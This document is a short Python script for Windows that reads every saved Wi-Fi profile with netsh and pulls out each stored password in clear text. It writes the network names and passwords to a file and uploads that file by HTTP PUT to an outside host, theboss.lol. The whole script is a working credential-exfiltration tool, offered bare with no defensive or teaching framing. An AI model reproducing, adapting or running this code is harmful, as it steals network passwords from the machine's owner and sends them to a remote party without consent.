import subprocess
import re
import requests

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = list()


if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)


with open('wifi.txt', 'w+') as fh:
    for x in wifi_list:
        fh.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")

with open('wifi.txt', 'rb') as fh:
    r = requests.put("http://theboss.lol/", data=fh)
    if r.status_code == 200:
        print('Success')
